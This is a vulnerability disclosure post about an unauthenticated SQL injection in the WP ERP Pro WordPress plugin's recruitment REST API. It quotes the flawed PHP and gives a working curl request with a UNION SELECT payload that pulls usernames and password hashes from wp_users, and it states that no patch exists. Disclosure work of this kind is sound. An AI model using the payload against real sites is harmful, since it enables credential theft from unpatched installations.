---
layout: post
title: "Unauthenticated SQL Injection in WP ERP Pro (CVE-2026-4834)"
date: 2026-05-27
description: A look at CVE-2026-4834, an unauthenticated SQL injection in the WP ERP Pro WordPress plugin's recruitment REST API that lets attackers read arbitrary data from the database.
img:
---

Well hello there! In today's post we will be exploring an SQL injection vulnerability I discovered in the WP ERP Pro WordPress plugin.

WP ERP Pro is the paid extension of the popular WP ERP plugin, bundling HR, CRM, and accounting modules into a single WordPress installation. The bug we are after exists inside a REST endpoint in the HR module.

## Vulnerability: Unauthenticated SQL Injection (Versions <= 1.5.1)

The HR module of the plugin contains a `RecruitmentController` class which exposes a `/wp-json/erp/v1/hrm/recruitment/jobs` endpoint which is defined in the code snippet below:

<pre class="line-numbers no-padding">
<code class="php">public function register_routes() {
    register_rest_route( $this->namespace, '/' . $this->rest_base . '/jobs', [
        [
            'methods'             => WP_REST_Server::READABLE,
            'callback'            => [ $this, 'get_jobs' ],
            'args'                => $this->get_collection_params(),
            'permission_callback' => function( $request ) {
                header( 'Access-Control-Allow-Origin: *' );
                header( 'Access-Control-Allow-Methods: POST, GET, OPTIONS, PUT, DELETE' );
                return true;
            },
        ],
        'schema' => [ $this, 'get_public_item_schema' ],
    ] );
}
</code></pre>

One detail immediately stands out. The `permission_callback` unconditionally returns true, which means that no authentication is required to reach the endpoint. That on its own is not a bug, but it opens the handler up to exploitation by anyone who can issue a request to it.

Requests to the endpoint are processed by the `get_jobs` function:

<pre class="line-numbers no-padding">
<code class="php">public function get_jobs( \WP_REST_Request $request ) {
    global $wpdb;

    $items_per_page  = ( isset( $request['per_page'] ) ) ? $request['per_page'] : 10;
    $page            = ( isset( $request['page'] ) ) ? $request['page'] : 1;
    $offset          = ( $page - 1 ) * $items_per_page;
    $today           = date( 'Y-m-d' );

    $query = "SELECT
            post.*
            FROM {$wpdb->prefix}posts AS post
            INNER JOIN {$wpdb->prefix}postmeta as pmeta
            ON pmeta.post_id = post.id
            WHERE post.post_type = 'erp_hr_recruitment'
            AND (
                (pmeta.meta_key = '_expire_date' AND pmeta.meta_value >= '$today')
               OR (pmeta.meta_key = '_expire_date' AND pmeta.meta_value = '')
            ) ";

    if ( isset( $request['status'] ) && $request['status'] !== '' && $request['status'] !== '-1' && ( $request['status'] === 'draft' || $request['status'] === 'pending' ) ) {
        $query .= " AND post.post_status='" . $request['status'] . "'";
    }
    if ( isset( $request['status'] ) && $request['status'] === 'publish' && $request['status'] !== '' && $request['status'] !== '-1' ) {
        $query .= " AND post.post_status='publish' AND ( DATE(pmeta.meta_value) > CURDATE() OR DATE(pmeta.meta_value) = ' ')";
    }
    if ( isset( $request['status'] ) && $request['status'] === 'expired' && $request['status'] !== '' && $request['status'] !== '-1' ) {
        $query .= " AND post.post_status='publish' AND ( DATE(pmeta.meta_value) < CURDATE() AND DATE(pmeta.meta_value) <> ' ')";
    }
    if ( isset( $request['search_key'] ) && $request['search_key'] !== '' ) {
        $query .= " AND post.post_title LIKE '%" . $request['search_key'] . "%'";
    }

    $query .= " ORDER BY id DESC LIMIT {$offset}, {$items_per_page}";

    $results = $wpdb->get_results( $query );
    ...
}
</code></pre>

The function reads a `search_key` query parameter from the request and concatenates it into a `LIKE` clause without any sanitization and executes the resulting query as a raw SQL statement using `$wpdb->get_results()`.

Because the `search_key` value lands between single quotes inside a `LIKE` query, all we need to do is close the quote, append an arbitrary SQL statement, and comment out the remaining query. 

While WordPress' `wpdb` driver does not allow stacked queries, we can still exploit this bug to get full read access to any table in the database by using a `UNION SELECT` statement.


The combination of no authentication and direct string concatenation allows us to read arbitrary data from the WordPress database, including the `wp_users` table (usernames, password hashes, emails) and the `wp_options` table where plugins routinely store API keys, SMTP credentials, and other secrets.

## So, how does this translate into a real-world exploit?

To pull this off, we have to terminate the `LIKE` clause early and inject a `UNION SELECT` clause targeting a different table, ensuring our column count matches the number of columns in WordPress' `posts` table.

For instance, we can make this request to read the username and password hash columns from the `wp_users` table. `wp_posts` has 23 columns, so the `UNION` matches that shape and pads out the rest of the columns with null values:

<pre class="line-numbers no-padding">
<code class="bash">curl -G "https://target.com/wp-json/erp/v1/hrm/recruitment/jobs" \
  --data-urlencode "search_key=x%' UNION SELECT null,null,null,null,user_login,user_pass,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null FROM wp_users-- -"
</code></pre>

The resulting response returns a list of arrays containing the usernames and password hash values from the `wp_users` table in the title and description parameters.

At the time of publication, no patch has been issued for this vulnerability. It is recommended to either disable the plugin or implement a manual patch until an official fix is released.

## Disclosure Timeline:

- **Vendor Contacted**: 26/02/2026
- **Vendor Response**: No response
- **Public Disclosure**: 21/05/2026
- **CVE Record**: [https://www.cve.org/CVERecord?id=CVE-2026-4834](https://www.cve.org/CVERecord?id=CVE-2026-4834)
- **Wordfence Advisory**: [https://www.wordfence.com/threat-intel/vulnerabilities/id/d3849db8-5c9e-410e-be53-c9ab76162630](https://www.wordfence.com/threat-intel/vulnerabilities/id/d3849db8-5c9e-410e-be53-c9ab76162630)